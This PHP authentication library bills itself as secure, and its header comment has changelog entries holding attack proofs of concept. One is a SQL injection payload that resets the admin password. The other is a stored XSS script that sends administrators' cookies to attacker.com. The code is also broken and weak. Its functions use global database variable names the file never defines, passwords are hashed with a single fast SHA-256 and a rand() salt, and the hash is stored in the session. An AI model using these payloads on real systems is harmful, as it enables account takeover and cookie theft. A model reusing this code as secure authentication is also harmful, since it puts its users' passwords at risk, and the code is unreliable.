<?php
/*
SECURE WEB AUTHENTICATION SYSTEM

S.W.A.S. uses SQL prepared statement, preventing SQLi, or SQL injection attacks against cyber attacks.
Hashed passwords are created with the following mechanism: SHA-256 Hash Algorithm + Random Salt.

Tip:
    1. Create a rate limit system.
        ->  $__MAX_LOGIN_ATTEMPT = 3;       // Maximum 3 login attempts
        ->  INSERT INTO users (id, pwd, salt, login_attempt) VALUES (?, ?, ?, ?)
        ->  if ((int)$row["login_attempt"] > $__MAX_LOGIN_ATTEMPT) { return false; }
        ->  

    2. Give a delay after one login attempt.
        -> sleep(3);        // PHP second unit delay: 3s
        -> usleep(3000000); // PHP micro-second unit delay: 3s (3,000,000)


!!! WARNING !!!
This software is only designed for prevention of SQLi attacks.
Any other web application vulnerabilities like XSS, CSRF, etc are not protected.
Please note that this software may have serious security vulnerabilities.



*************************************************FUNCTION TABLE*************************************************

[Function]                          [Description]
getSalt( $id )                      Inquiry the salt for the given ID.
createSalt()                        Generate a random salt integer between 0 to 999999.
login( $id, $password )             Attempt to login to the account using the given ID and password.
register ( $id, $password )         Attempt to register a new account using the given ID and password.
logout()                            Clear the sessions and cookies for currently authenticated user.
setSessions( $id, $password )       Set authentication information (ID and Password) on server side.
setCookies( $id )                   Set authentication information (ID Only) on client side.

******************************************************************************************************************



***************************************************UPDATE LOGS***************************************************

2025-01/21 - User Information Update System Removed:
    SQL injection vulnerability has been found at
    ->  UPDATE users SET " . $data_type . " = ? WHERE id = ?

    Attack PoC:
    ->  Type = salt = '1234', pwd = 'sha256(12341234)' WHERE id = 'admin'; #
    ->  UPDATE users SET salt = '1234', pwd = 'sha256(12341234)' WHERE id = 'admin'; # WHERE id = ?
    ->  // Set the admininstrator account password and salt to 1234.

2025-01/18 - Email Register System & Admin Page System Removed:
    Stored XSS vulnerability has been found at
    ->  while($row = $result->fetch_assoc()) {
    ->      echo "<tr>";
    ->      foreach ($row as $key => $value) {
    ->          echo "<td>" . $value . "</td>";
    ->      }
    ->      echo "</tr>";
    ->  }
    
    Attack PoC:
    ->  Email = <script>fetch('https://attacker.com?cookie=' + document.cookie);</script>
    ->  ... <tr><td><script>fetch('https://attacker.com?cookie=' + document.cookie);</script></td></tr> ...
    ->  // Execute malicious javascript against the administrators.

Additional Note: Both vulnerabilities has been removed for public release.

*****************************************************************************************************************

*/

session_start();

$__GLOBAL_SERVER_NAME   = "";       // MySQL Server Address
$__GLOBAL_USER_NAME     = "";       // MySQL Username
$__GLOBAL_PASSWORD      = "";       // MySQL Password
$__GLOBAL_DB_NAME       = "";       // MySQL Database Name

$__CLIENT_SIDE_ID_NAME = "ID";      // Cookie Key Name

function getSalt($id) {
    global $servername, $username, $password, $dbname;
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die();
    }
    // Inquiry all data from the user
    $sql = "SELECT * FROM users WHERE id = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param('s', $id);
    $stmt->execute();
    $result = $stmt->get_result();
    $conn->close();

    // Get results
    if ($result && $result->num_rows > 0) {
        $row = $result->fetch_assoc();
        // return salt
        return $row["salt"];
    } else {
        return false;
    }
}

function createSalt() {
    return rand(0, 999999);
}

function login($id, $pwd) {
    global $servername, $username, $password, $dbname;
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die();
    }
    // Inquiry all data from the user who has the given password
    $sql = "SELECT * FROM users WHERE id = ? AND pwd = ?";
    $stmt = $conn->prepare($sql);
    $salt = getSalt($id);
    $hpwd = hash("sha256", $pwd . $salt);
    $stmt->bind_param('ss', $id, $hpwd);
    $stmt->execute();
    $result = $stmt->get_result();
    $conn->close();
    if ($result && $result->num_rows > 0) {
        $row = $result->fetch_assoc();

        // Get user information from here using $row["INFO_HERE"];

        setSessions($id, $hpwd);    // Set session (server-side)
        return true;                // Return success signal
    } else {
        return false;               // Return failed signal
    }
}

function register($id, $pwd) {
    global $servername, $username, $password, $dbname;
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die();
    }
    // Find accounts that has same ID with the given ID
    $sql = "SELECT * FROM users WHERE id = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param('s', $id);
    $stmt->execute();
    $result = $stmt->get_result();
    $conn->close();

    // Check if the given ID exists
    if ($result && $result->num_rows > 0) {
        return false;       // Return failed signal: ID already exists
    } else {
        $conn = new mysqli($servername, $username, $password, $dbname);
        if ($conn->connect_error) {
            die();
        }
        $salt = createSalt(); // Generate random salt integer
        $hpwd = hash("sha256", $pwd . $salt); // create hashed password with salt

        // Create new account
        $sql = "INSERT INTO users (id, pwd, salt) VALUES (?, ?, ?)";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("sss", $id, $hpwd, $salt);
        if ($stmt->execute()) {
            $conn->close();
            return true;                // Return success signal
        } else {
            $conn->close();
            return false;               // Return failed signal
        }
    }
}

function logout() {
    if (isset($_SESSION["LoginID"]) && isset($_SESSION["LoginPWD"])) {
        session_destroy();      // Remove all session data
    }
    
    if (isset($_COOKIE[$__CLIENT_SIDE_ID_NAME]) && $_COOKIE[$__CLIENT_SIDE_ID_NAME] != "") {
        unset($_COOKIE[$__CLIENT_SIDE_ID_NAME]);    // Remove client-side ID information
    }
}

function setSessions($id, $pwd) {
    $_SESSION["LoginID"] = $id;         // Set login ID information
    $_SESSION["LoginPWD"] = $pwd;       // Set login password information
}

function setCookies($id) {
    $cookiePath = "/";
    setcookie($__CLIENT_SIDE_ID_NAME, $id, time() + (86400 * 1), $cookiePath);      // Set client-side login ID information
    // Expires in 24h
}

?>